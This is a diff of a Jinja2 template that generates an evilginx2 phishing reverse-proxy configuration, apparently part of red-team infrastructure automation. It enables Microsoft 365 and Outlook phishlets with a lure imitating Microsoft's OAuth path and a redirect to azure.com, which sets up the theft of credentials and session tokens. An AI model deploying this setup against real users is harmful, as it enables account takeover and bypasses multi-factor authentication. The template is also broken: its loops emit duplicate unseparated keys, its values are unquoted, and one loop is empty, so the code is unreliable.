@@ -1,18 +1,21 @@
+{% for vm in warhorse.vm|selectattr("evilginx2", "defined" ) %}
+{% if vm.evilginx2.enabled %}
 {
   "bind_ipv4": "0.0.0.0",
   "blacklist": {
-    "mode": "noadd"
+    "mode": "unauth"
   },
   "general": {
     "bind_ipv4": "",
     "dns_port": 53,
-    "domain": '{{ evilginx_domain }}',
+    "domain": {{vm.evilginx2.evilginx_domain }},
     "external_ipv4": "0.0.0.0",
     "https_port": 443,
     "ipv4": "",
     "unauth_url": ""
   },
-  "lures": [
+{% for lures in vm.evilginx2.lures %}
+ "lures": [
     {
       "hostname": "",
       "id": "",
@@ -24,23 +27,28 @@
       "path": "/common/oauth2/v2.0",
       "paused": 0,
       "phishlet": "o365",
-      "redirect_url": "",
+      "redirect_url": "www.azure.com",
       "redirector": "",
       "ua_filter": ""
     }
   ],
-  "phishlets": {
+{% endfor %}
+"phishlets": {
     "o365": {
-      "hostname": '{{ evilginx_domain }}',
-      "unauth_url": '{{ redirect_domain }}',
+      "hostname": {{ vm.evilginx2.evilginx_domain }},
+      "unauth_url": {{ vm.evilginx2.redirect_domain }},
       "enabled": true,
       "visible": true
     },
     "outlook": {
-      "hostname": {{ evilginx_domain }}',
-      "unauth_url": '{{ redirect_domain }}',
+      "hostname": {{ vm.evilginx2.evilginx_domain }},
+      "unauth_url": {{ vm.evilginx2.redirect_domain }},
       "enabled": true,
       "visible": true
     }
   }
 }
+{% for phishlets in vm.evilginx2.phishlets %}
+{% endfor %}
+{% endif %}
+{% endfor %}
